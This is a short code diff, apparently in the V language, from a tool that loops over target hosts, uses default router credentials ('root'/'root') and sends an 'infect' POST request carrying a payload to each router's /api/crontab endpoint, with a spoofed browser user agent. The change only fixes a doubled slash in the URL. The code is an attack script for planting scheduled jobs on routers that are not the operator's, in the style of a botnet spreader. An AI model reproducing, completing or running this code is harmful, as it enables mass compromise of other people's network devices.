@@ -31,7 +31,7 @@ fn main(){
 				"router_user": "root"
 				"router_pass": "root"
 			}
-			mut infect := http.new_request(.post, "http://${i}//api/crontab", "data=${payload}") or { print("[40;38;2;247;21;184m[-] Fatal error: Failed to perform the request") continue }
+			mut infect := http.new_request(.post, "http://${i}/api/crontab", "data=${payload}") or { print("[40;38;2;247;21;184m[-] Fatal error: Failed to perform the request") continue }
 	        infect.add_header(.authorization, "data=${data}")
 	        infect.add_header(.user_agent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36")
 	        infect.add_header(.origin, "${i}")
